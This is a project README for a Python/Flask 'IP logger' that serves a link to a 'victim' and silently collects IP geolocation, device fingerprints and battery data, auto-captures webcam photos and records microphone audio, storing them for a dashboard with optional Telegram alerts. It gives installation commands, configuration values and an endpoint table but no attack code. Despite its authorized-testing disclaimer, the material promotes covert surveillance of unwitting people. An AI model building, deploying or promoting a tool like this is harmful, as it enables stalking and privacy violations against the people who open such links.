<div align="center">

# 🔍 RISHI ULTIMATE IP TOOL v14.0

[![Python](https://img.shields.io/badge/Python-3.8+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Flask](https://img.shields.io/badge/Flask-2.x-000000?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com)
[![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Termux%20%7C%20Windows-brightgreen?style=for-the-badge)](https://github.com)
[![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)](LICENSE)
[![SQLite](https://img.shields.io/badge/Database-SQLite-003B57?style=for-the-badge&logo=sqlite&logoColor=white)](https://sqlite.org)

**Advanced IP Logger, Device Fingerprinter & Media Capture Tool**  
*Built for educational research, security testing & OSINT on authorized systems only.*

</div>

---

## 📌 Overview

**RISHI Ultimate IP Tool** is a powerful Python-based tool that spins up a local Flask web server and silently collects device intelligence when a target visits the generated link. It captures:

- **IP Address** with full geolocation (City, ISP, Country, GPS)
- **Device Fingerprint** (screen, platform, browser language, timezone)
- **Battery & Network** info
- **Webcam Photos** (auto-captured on visit)
- **Microphone Audio** (5-second recording on visit)

All data is stored locally in SQLite + JSON files, viewable through a sleek built-in web dashboard.

---

## ✨ Key Features

### 🌐 IP & Geolocation
- Real-time IP detection via `ipinfo.io`
- Full geolocation: City, Region, Country, ISP, Postal, Timezone
- Google Maps link generation from GPS coordinates

### 📱 Device Intelligence
- Screen resolution, platform, browser language
- Battery percentage and charging status
- Network type and download speed (Mbps)
- GPS coordinates (if user grants permission)

### 📸 Webcam Capture
- Silently accesses front/back camera via browser API
- Captures JPEG photos every 5 seconds
- Stored in per-session `photos/` folder

### 🎙️ Microphone Recording
- Records 5 seconds of audio on visit
- Saved as `.webm` audio file per session

### 🖥️ Web Viewer Dashboard
- Beautiful dark-themed session viewer at `/viewer`
- Per-session detail pages with photo gallery + audio player
- One-click file download and delete
- Real-time session search

### 🗄️ Persistent Storage
- SQLite database for all session metadata
- JSON file per session for device info
- Organized folder structure under `data/`

---

## 📂 Project Structure

```
rishi-ip-tool/
│
├── rishi.py              # Main tool — Flask server + CLI menu
├── ultimate_logs.db      # SQLite database (auto-created)
├── requirements.txt      # Python dependencies
├── .gitignore
├── LICENSE
├── README.md
│
└── data/                 # Session data (auto-created)
    └── 2024-01-15_12-30-00/
        ├── device_info.json
        ├── photos/
        │   ├── photo_123456.jpg
        │   └── photo_123501.jpg
        └── audio/
            └── audio_123456.webm
```

---

## ⚙️ Installation & Usage

### 🐧 Linux / Termux

```bash
# 1. Clone the repository
git clone https://github.com/rishi-security-labs/rishi-ip-tool.git
cd rishi-ip-tool

# 2. Install dependencies
pip install -r requirements.txt

# 3. Run the tool
python rishi.py
```

### 🪟 Windows

```powershell
# 1. Clone
git clone https://github.com/rishi-security-labs/rishi-ip-tool.git
cd rishi-ip-tool

# 2. Install dependencies
pip install -r requirements.txt

# 3. Run
python rishi.py
```

### 📱 Termux (Android)

```bash
pkg update && pkg upgrade
pkg install python git
pip install flask requests colorama
git clone https://github.com/rishi-security-labs/rishi-ip-tool.git
cd rishi-ip-tool
python rishi.py
```

---

## 📦 Requirements

```
flask
requests
colorama
```

Install all at once:
```bash
pip install flask requests colorama
```

---

## 🖥️ Menu Options

| Option | Function |
|--------|----------|
| `1` | View your own IP information |
| `2` | Lookup any IP address |
| `3` | Start IP Logger (Flask server on port 5000) |
| `4` | View recent sessions from database |
| `5` | Open Web Viewer in browser |
| `6` | Clear all sessions and data |
| `7` | About |
| `0` | Exit |

---

## 🔧 Configuration

Edit these values at the top of `rishi.py`:

```python
BOT_TOKEN = "YOUR_BOT_TOKEN"   # Telegram bot token (optional, for notifications)
CHAT_ID   = "YOUR_CHAT_ID"     # Telegram chat ID (optional)
DB_FILE   = "ultimate_logs.db" # SQLite database filename
DATA_DIR  = "data"             # Folder where session data is stored
PORT      = 5000               # Flask server port
```

---

## 🌐 API Endpoints

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Target page (served to victim) |
| `/log` | POST | Receives device info from client JS |
| `/photo` | POST | Receives base64 webcam photo |
| `/audio` | POST | Receives base64 mic audio |
| `/viewer` | GET | Session list dashboard |
| `/folder/<session>` | GET | Single session detail view |
| `/file/<path>` | GET | Serve a captured file |
| `/download/<path>` | GET | Download a captured file |
| `/delete/<session>` | POST | Delete a session folder + DB record |
| `/delete_file` | POST | Delete a single file |

---

## ⚠️ Disclaimer

> This tool is intended **strictly for educational purposes**, authorized penetration testing, and security research on systems you own or have explicit written permission to test.  
> Using this tool against individuals without consent is **illegal** and violates computer crime laws in most jurisdictions.  
> The developer assumes **no liability** for misuse.

---

## 📄 License

```
MIT License

Copyright (c) 2024 RISHI

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.
```

---

<div align="center">
Made with ❤️ by <b>RISHI</b> · v14.0
</div>
